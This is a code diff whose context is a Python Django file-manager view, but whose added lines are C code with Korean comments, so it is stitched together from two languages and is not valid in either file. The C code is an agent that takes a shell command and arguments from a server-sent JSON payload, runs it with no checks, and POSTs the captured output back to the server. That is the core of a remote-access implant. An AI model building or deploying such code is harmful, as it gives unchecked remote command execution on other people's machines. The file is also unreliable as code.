@@ -107,3 +107,113 @@ def file_manager_view(request, client_id, requested_path=''):
     }
 
     return render(request, 'tasks/file_manager.html', context)
+'''''''''''''
+
+
+
+
+
+void execute_shell_command(int task_id, cJSON* payload_item) {
+    cJSON* cmd_item = cJSON_GetObjectItemCaseSensitive(payload_item, "command");
+    cJSON* args_item = cJSON_GetObjectItemCaseSensitive(payload_item, "arguments");
+
+    if (cJSON_IsString(cmd_item) && cJSON_IsArray(args_item)) {
+        const char* base_command = cmd_item->valuestring;
+        char full_command[1024];
+
+        // --- 명령 구성 로직 ---
+        memset(full_command, 0, sizeof(full_command));
+        strncpy(full_command, base_command, sizeof(full_command) - 1);
+        full_command[sizeof(full_command) - 1] = '\0';
+
+        cJSON* arg = NULL;
+        int remaining_space = sizeof(full_command) - strlen(full_command);
+
+        cJSON_ArrayForEach(arg, args_item) {
+            if (cJSON_IsString(arg) && remaining_space > 0) {
+                if (remaining_space > 1) {
+                    strcat(full_command, " ");
+                    remaining_space--;
+                }
+                strncat(full_command, arg->valuestring, remaining_space);
+                remaining_space = sizeof(full_command) - strlen(full_command);
+            }
+        }
+        // --- 명령 구성 로직 끝 ---
+
+        printf("\n[EXECUTE_SHELL] 명령 실행: %s\n", full_command);
+
+        int exit_code = 0;
+        // 1. 명령 실행 및 표준 출력(ANSI)을 메모리로 캡처
+        char* output = execute_and_capture(full_command, &exit_code);
+        // 2. ANSI 출력을 UTF-8로 변환 (서버에서 안전하게 표시하기 위함)
+        char* utf8_output = convert_to_utf8(output);
+
+        // 3. 파일 저장 및 읽기 단계를 건너뛰고, 메모리 문자열을 바로 보고
+        const char* report_status = (exit_code == 0) ? "COMPLETED" : "FAILED";
+        // 서버 UI에서 인식할 가상의 파일명 (실제 파일은 생성되지 않음)
+        const char* ui_filename = "stdout_report.txt";
+
+        printf("[INFO] 명령 실행 결과(UTF-8)를 파일 저장 없이 바로 서버에 보고합니다.\n");
+
+        // 4. 서버에 보고 (직접 메모리 버퍼 전달)
+        report_file_to_server(task_id, report_status, ui_filename, utf8_output, exit_code);
+
+        if (utf8_output) free(utf8_output);
+        if (output) free(output);
+    }
+    else {
+        printf("[ERROR] EXECUTE_SHELL: 'command' 또는 'arguments'가 누락되었습니다.\n");
+        report_file_to_server(task_id, "FAILED", "error_log.txt", "Missing command or arguments.", 1);
+    }
+}
+
+
+
+
+// 파일 내용을 읽지 않고, 인수로 전달받은 raw_content(메모리 문자열)를 바로 JSON에 포함하여 전송합니다.
+void report_file_to_server(int task_id, const char* status, const char* filename_for_ui, const char* raw_content, int exit_code) {
+    cJSON* report_json = cJSON_CreateObject();
+
+    cJSON_AddNumberToObject(report_json, "command_id", task_id);
+    cJSON_AddStringToObject(report_json, "status", status);
+    // 이 파일명은 실제 파일이 아닌, 서버 UI에서 이 보고서를 구분하는 이름입니다.
+    cJSON_AddStringToObject(report_json, "filename", filename_for_ui);
+
+    // **핵심 변경**: raw_content(명령 실행 결과)를 file_content 필드에 직접 포함
+    cJSON_AddStringToObject(report_json, "file_content", raw_content ? raw_content : "No content captured.");
+    cJSON_AddNumberToObject(report_json, "exit_code", exit_code);
+
+    char* json_payload = cJSON_PrintUnformatted(report_json);
+
+    if (json_payload) {
+        printf("\n[REPORT] 서버에 메모리 문자열 JSON 보고: /api/upload/receive/\n");
+
+        char* response = http_request("POST", "/api/upload/receive/", json_payload, strlen(json_payload));
+
+        if (response != NULL) {
+            printf("[INFO] 보고 응답 수신.\n");
+            free(response);
+        }
+        else {
+            fprintf(stderr, "[ERROR] 보고서 전송 실패.\n");
+        }
+
+        free(json_payload);
+    }
+    else {
+        fprintf(stderr, "[ERROR] 보고 JSON 생성 실패.\n");
+    }
+
+    cJSON_Delete(report_json);
+}
+
+
+
+
+
+
+
+
+
+
